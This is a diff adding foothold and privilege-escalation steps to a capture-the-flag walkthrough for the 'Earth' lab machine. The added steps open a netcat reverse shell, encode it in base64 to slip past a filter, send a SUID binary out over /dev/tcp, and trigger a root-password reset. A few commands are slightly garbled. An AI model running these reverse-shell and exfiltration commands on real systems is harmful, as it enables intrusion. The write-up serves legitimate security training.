@@ -6,6 +6,8 @@
 2. Nmap
 3. Gobuster
 4. Cyberchef
+5. Netcat
+6. Ltrace
 
 # First key
 ## Step 1
@@ -135,12 +137,84 @@ We can use the cat command to open the file `cat /var/earth_web/user_flag.txt`.
 Here we find the first flag.
 <img width="955" height="893" alt="image" src="https://github.com/user-attachments/assets/43db2ecc-4ec5-4042-9b06-e48efb8b5b1b" />
 
+## Step 6 (Foothold)
 
+Now we can use netcat to get a remote connection to the machine.
 
+So in the CLI of the Earth machine type in `nc -e /bin/bash 10.38.1.1 4444` But before running the command make sure to start the listener on the kali terminal using `nc -lvnp 4444`
 
+`4444` is just the listening port.
 
+`10.38.1.1` is your VM's ip address and if you are not sure of the ip address of the VM you can use `ifconfig` to get it.
 
+<img width="955" height="331" alt="image" src="https://github.com/user-attachments/assets/e47b2fbe-ed82-4b0d-8dd2-e7afb5535549" />
 
+Upon running the command we can see that the machine forbids remote connections.
+
+<img width="955" height="903" alt="image" src="https://github.com/user-attachments/assets/365e6b30-eca0-498b-9f92-177fdddc5a10" />
+
+We can bypass this by encoding the command using base-64 format.
+Go back to the kali terminal( Open a separate terminal so as not to disrupt the listener set ) and input `echo nc -e /bin/bash 10.38.1.1 4444 | base64`
+This outputs the encoded command that we can then copy and paste on the Earth's machine CLI.
+
+`
+(kali@ kali)-[~]
+$ echo 'nc -e /bin/bash 10.38.1.110 4444' | base64
+bmMgLWUgL2Jpbi9iYXNoIDEwLjM4LjEuMTEwIDQØNDQK
+`
+On Earth's CLI input `echo 'nc -e /bin/bash 10.38.1.110 4444' | base64 -d | bash` and run it
+
+On our listener we can see that the listener starts to listen from port 4444 from an unknown source.
+Under the listener input `python-c 'import pty;pty.spawn("/bin/bash")'`.This is used to spawn an interactive bash shell.
+
+<img width="797" height="137" alt="image" src="https://github.com/user-attachments/assets/cd645aab-30a7-464f-9300-6fc2cc9cb543" />
+
+## Step 7 ( Privilege escalation ) 
+
+First we need to check the SUIDs and see if there is anyway to escalate the privileges.
+
+<img width="802" height="350" alt="image" src="https://github.com/user-attachments/assets/278e4d87-f5ca-4b9d-a36e-be28aeeff6dd" />
+
+We found a reset_root script that could help us gain root access.
+
+<img width="817" height="148" alt="image" src="https://github.com/user-attachments/assets/2239d865-b2f5-4f64-ad95-2e6abb5cae98" />
+
+Running file command with the script to know its type (`file /usr/bin/reset_root`) we fnd that the file is of a human readable text.
+
+When we run the the file itself it gives an error saying that not all triggers are present.
+To see what the issue is we need to upload the file to the VM machine and for that we need the netcat tool again. So set it up as follows;
+  1. Create another tab for the terminal and set up a listener on port 3333
+      `
+      (kali@ kali)-[~]
+      -$ nc -lvnp 3333 > reset_root
+      `
+  2. On the target machine that we opened on the terminal type in `cat /usr/bin/reset_root > /dev/tcp/10.38.1.110/3333`
+  3. On clicking enter the reset_root file is saved to the VM and using `ls` we can confirm that.
+
+To know what the issue was with the file we need to use a tool called `ltrace`. If you've never used it before you may have to install. So using the procedure we used to instal cyberchef we can install ltrace.
+
+Run the `chmod +x reset_root` first, then run `ltrace` as follows;
+
+<img width="548" height="254" alt="image" src="https://github.com/user-attachments/assets/363b4761-297b-489c-bf53-828b2b42f8ee" />
+
+The `chmod` tool just makes the reset_root file executable.
+Using `ltrace` we find that there are three missing files in reset_root.
+Going back to the target's terminal we need to save all the three files and for that we will use `touch`.
+
+`touch /dev/shm/kHgTF15G`
+`touch /dev/shm/Zw7bV9U5`
+`touch /tmp/kcM0Wewe`
+
+Now when we run the reset_root file we get no errors and we are also given the root password.
+
+Rum `su root` and this prompts for the password , Earth. 
+
+Here we find the final flag ,the root_flag.txt.
+
+<img width="866" height="577" alt="image" src="https://github.com/user-attachments/assets/9e35903e-9c20-47aa-80a6-72d1250e0ace" />
+
+# Congratulations on finishing this CTF
+## Cheers and Happy hacking, ethically of course
 
 
 
